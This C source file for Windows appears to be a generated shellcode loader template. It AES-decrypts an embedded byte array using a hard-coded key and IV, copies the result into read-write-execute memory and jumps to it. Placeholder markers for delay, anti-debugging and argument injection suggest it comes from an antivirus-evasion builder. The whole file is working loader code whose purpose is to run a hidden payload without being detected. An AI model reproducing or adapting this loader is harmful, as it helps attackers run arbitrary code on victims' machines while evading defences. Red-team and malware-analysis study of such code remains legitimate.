#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <bcrypt.h>


//####DEFINE####

int aes_decrypt_2e1cc95919334040ab0303f99ec19a54(unsigned char* encoded, int length) {

    unsigned char key[] = {0x74,0xd8,0x12,0xdd,0xb2,0x04,0xab,0x03,0xac,0x05,0x3b,0xd1,0x05,0xa8,0xbe,0x52,0x7a,0xad,0x6a,0x00,0xc6,0x81,0x3f,0xbd,0x38,0x7d,0x82,0x39,0x78,0xf1,0x09,0x2a};
    int key_length = sizeof(key);
    unsigned char iv[] = {0x91,0x37,0x55,0x09,0x6d,0xc5,0xff,0x1e,0x74,0xe3,0x8e,0xf8,0x48,0xa6,0xfb,0xa2};
    int iv_length = sizeof(iv);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbData, dwLength = length;
    PBYTE pbKeyObject = NULL;

    printf("\n[*] Before AES values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Open an algorithm handle
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptOpenAlgorithmProvider failed\n");
        return -1;
    }

    // Calculate the size of the buffer to hold the KeyObject
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGetProperty failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject) {
        printf("[-] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Generate the key from supplied input key bytes
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, key_length, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGenerateSymmetricKey failed\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Decrypt the data
    status = BCryptDecrypt(hKey, encoded, length, NULL, iv, iv_length, encoded, length, &dwLength, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptDecrypt failed\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Debug statement to print the decrypted values
    printf("\n[*] After AES values: {");
    for (DWORD i = 0; i < dwLength; i++) {
        printf("0x%02x", encoded[i]);
        if (i < dwLength - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return dwLength;
}


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x54,0xde,0x6f,0x89,0x50,0xe9,0x60,0x00,0xb8,0x56,0x51,0x35,0x42,0x56,0xb9,0x49,0xed,0xf7,0xe2,0x28,0xbd,0x78,0xa5,0x93,0x75,0x77,0x44,0x13,0x49,0x03,0xe3,0xeb,0x60,0xc0,0x7e,0x2c,0x1a,0x13,0xd7,0x4d,0x36,0xed,0x44,0x59,0xbf,0x7e,0x5e,0xe5,0x57,0x2a,0x5f,0x5a,0x21,0x63,0xb2,0xea,0xa2,0x72,0xde,0x31,0x0e,0x36,0xb5,0xf1,0xd0,0x35,0xe6,0x3d,0xc8,0x58,0xde,0xc4,0x50,0xa1,0x1d,0xd6,0xa7,0x05,0x70,0xea,0xa2,0xf2,0x89,0x85,0x53,0xd5,0x06,0xa1,0x08,0x08,0xd8,0xbd,0x81,0x5c,0x70,0xe5,0x5c,0x78,0x3f,0x0f,0x22,0x01,0x69,0xfb,0xba,0x12,0xb0,0x37,0x9f,0x20,0xe6,0xfc,0x4c,0x46,0x72,0xa0,0xee,0x65,0x6f,0xc0,0x0e,0x19,0xa9,0x03,0x47,0x82,0xb2,0x9a,0xc1,0x04,0x08,0x8e,0x81,0xf4,0xdc,0xee,0x51,0x9a,0x51,0xa7,0xc6,0x58,0xf5,0x2c,0x08,0x9a,0xd4,0xb4,0x58,0xd5,0x27,0xf4,0x9b,0x27,0x6a,0xac,0x3e,0xde,0x90,0x2f,0xd3,0x2a,0xb5,0xff,0x84,0x41,0xdb,0x3d,0x7a,0x29,0x37,0x5f,0xbb,0xe1,0x20,0x1b,0xe0,0x13,0xa5,0x34,0x6b,0xd8,0xd1,0x49,0x69,0x77,0xe7,0xbd,0x0d,0x64,0x67,0xd4,0x9e,0x86,0xea,0x1a,0x37,0x51,0xf7,0x07,0x7b,0x06,0x98,0x4b,0x5d,0x59,0xa4,0xa5,0xe9,0x36,0xad,0x20,0xc4,0x0c,0x51,0x6a,0x29,0x2d,0x36,0xad,0xb8,0xcd,0x33,0x74,0x21,0x3c,0x22,0x6d,0x11,0xe3,0xe4,0x3b,0x0c,0xd8,0x5c,0x6c,0x44,0x66,0x95,0x2d,0xa9,0xba,0x60,0x01,0x00,0xbb,0xcf,0xea,0xe2,0xe7,0x1f,0xdc,0x99,0xdc,0x2c,0x67,0x9e,0x89,0x22,0x23,0x05,0x49,0xf9,0x32,0x56,0xd9,0x3c,0x23,0x58,0x5a,0x9a,0x50,0xf2,0xf7,0xf5,0xd5,0x06,0x09,0x6b,0xe1,0x62,0xee,0x44,0x62,0x4a,0xb7,0x17,0xb9};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = aes_decrypt_2e1cc95919334040ab0303f99ec19a54(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
